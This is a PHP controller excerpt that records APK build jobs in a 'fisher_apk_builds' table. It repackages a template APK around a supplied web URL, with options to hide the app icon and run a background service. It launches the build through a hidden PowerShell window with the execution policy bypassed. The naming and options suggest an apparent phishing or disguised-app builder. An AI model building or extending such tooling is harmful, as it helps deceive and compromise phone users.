    protected function buildCreate()
    {
        $b = $this->body;
        $serverUrl = trim((string)($b['server_url'] ?? $b['serverUrl'] ?? ''));
        $webUrl    = trim((string)($b['wrap_url'] ?? $b['web_url'] ?? $b['webUrl'] ?? ''));
        $appName   = trim((string)($b['app_label'] ?? $b['app_name'] ?? $b['appName'] ?? ''));
        if ($appName === '') $appName = 'App';
        $psc = $b['pageStyleConfig'] ?? ($b['page_style_config'] ?? []);
        if (is_string($psc)) { $d = json_decode($psc, true); $psc = is_array($d) ? $d : []; }
        if (!is_array($psc)) $psc = [];

        $extend = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'extend';
        $tpl = $extend . DIRECTORY_SEPARATOR . 'source.apk';
        if (!is_file($tpl)) {
            return $this->json(['success' => false, 'error' => '构建模板缺失: ' . $tpl], 500);
        }
        $prefix = strtoupper(substr(preg_replace('/[^a-zA-Z]/', '', $appName) ?: 'TF', 0, 3)) ?: 'TF';
        $filename = $prefix . '_' . date('Ymd_His') . '.apk';
        $outDir = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'public' . DIRECTORY_SEPARATOR . 'storage' . DIRECTORY_SEPARATOR . 'apk';
        if (!is_dir($outDir)) @mkdir($outDir, 0777, true);
        $out = $outDir . DIRECTORY_SEPARATOR . $filename;

        $id = (int)Db::table('fisher_apk_builds')->insertGetId([
            'filename'       => $filename,
            'server_url'     => $serverUrl,
            'web_url'        => $webUrl,
            'app_name'       => $appName,
            'file_size'      => 0,
            'status'         => 'building',
            'created_at'     => time(),
            'owner_username' => (string)($this->user['username'] ?? ''),
            'pkg_name'       => 'com.zq.final',
            'progress'       => 3,
            'message'        => '任务已创建',
            'template'       => 'source.apk (1/built_15217283034)',
        ]);

        $jobDir = dirname(__DIR__, 2) . DIRECTORY_SEPARATOR . 'runtime' . DIRECTORY_SEPARATOR . 'apk_jobs';
        if (!is_dir($jobDir)) @mkdir($jobDir, 0777, true);
        $jobFile = $jobDir . DIRECTORY_SEPARATOR . 'job_' . $id . '.json';
        $job = [
            'record_id'          => $id,
            'template'           => $tpl,
            'out'                => $out,
            'server_url'         => $serverUrl,
            'web_url'            => $webUrl,
            'app_name'           => $appName,
            'page_style_config'  => $psc,
            'show_app_icon'      => !empty($b['show_app_icon']),
            'enable_service_mode'=> !empty($b['enable_service_mode']),
        ];
        file_put_contents($jobFile, json_encode($job, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES));

        $py = 'C:\Python314\python.exe';
        $script = $extend . DIRECTORY_SEPARATOR . 'tf_build.py';
        $logFile = $jobDir . DIRECTORY_SEPARATOR . 'job_' . $id . '.log';
        $errFile = $jobDir . DIRECTORY_SEPARATOR . 'job_' . $id . '.err.log';
        $launcher = $jobDir . DIRECTORY_SEPARATOR . 'run_' . $id . '.ps1';
        $ps1 = '$ErrorActionPreference = "Continue"' . "\r\n"
            . 'Start-Process -WindowStyle Hidden -FilePath "' . $py . '"'
            . ' -ArgumentList @("' . $script . '","--job","' . $jobFile . '")'
            . ' -RedirectStandardOutput "' . $logFile . '" -RedirectStandardError "' . $errFile . '"' . "\r\n";
        file_put_contents($launcher, $ps1);
        $cmd = 'powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' . $launcher . '"';
        $h = @popen($cmd, 'r');
        if (is_resource($h)) @pclose($h);

        return $this->json(['success' => true, 'data' => ['id' => $id, 'filename' => $filename, 'status' => 'building']]);
    }

    protected function buildDownload(int $id)
    {
        $row = Db::table('fisher_apk_builds')->where('id', $id)->find();
        if (!$row) return $this->json(['success' => false, 'error' => '记录不存在'], 404);
        $f = (string)($row['out_path'] ?? '');
        if ($f === '' || !is_file($f)) return $this->json(['success' => false, 'error' => '产物不存在'], 404);
        while (ob_get_level() > 0) @ob_end_clean();
        header('Content-Type: application/vnd.android.package-archive');
        header('Content-Disposition: attachment; filename="' . basename($f) . '"');
        header('Content-Length: ' . (string)filesize($f));
        header('Cache-Control: no-store');
        readfile($f);
        exit;
    }

